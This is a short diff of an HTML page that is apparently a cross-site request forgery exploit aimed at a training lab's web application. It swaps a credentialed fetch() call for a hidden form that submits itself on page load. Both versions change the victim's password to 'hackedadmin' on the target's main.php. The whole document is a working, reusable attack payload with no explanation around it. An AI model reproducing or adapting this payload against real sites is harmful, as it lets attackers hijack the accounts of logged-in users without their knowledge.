@@ -1,14 +1,11 @@
 <html>
   <body>
+    <form action="http://web.vpmi6ivdfq6u54825se6.labs.cyber-ed.space/main.php" method="POST" id="csrf_form">
+      <input type="hidden" name="action" value="change_password">
+      <input type="hidden" name="new_password" value="hackedadmin">
+    </form>
     <script>
-      fetch('http://web.vpmi6ivdfq6u54825se6.labs.cyber-ed.space/main.php', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: 'action=change_password&new_password=hackedadmin',
-        credentials: 'include'
-      }).then(() => console.log('Request sent'));
+      document.getElementById('csrf_form').submit();
     </script>
   </body>
 </html>
